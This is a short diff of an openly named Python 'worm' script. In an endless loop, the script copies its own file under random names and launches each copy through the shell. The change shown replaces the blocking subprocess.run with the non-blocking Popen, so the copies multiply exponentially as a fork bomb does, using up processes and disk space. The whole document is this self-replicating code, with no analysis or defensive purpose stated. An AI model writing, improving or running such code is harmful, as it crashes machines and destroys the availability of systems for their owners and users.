@@ -1,4 +1,4 @@
-from subprocess import run
+from subprocess import Popen
 from shutil import copy
 from random import seed, randint
 
@@ -16,4 +16,4 @@ while True:
     # Create a version of itself
     file_name = "worm"+str(randint(2, 5000))+".py"
     copy(__file__, file_name)
-    run((file_name), shell=True)
+    Popen((file_name), shell=True)
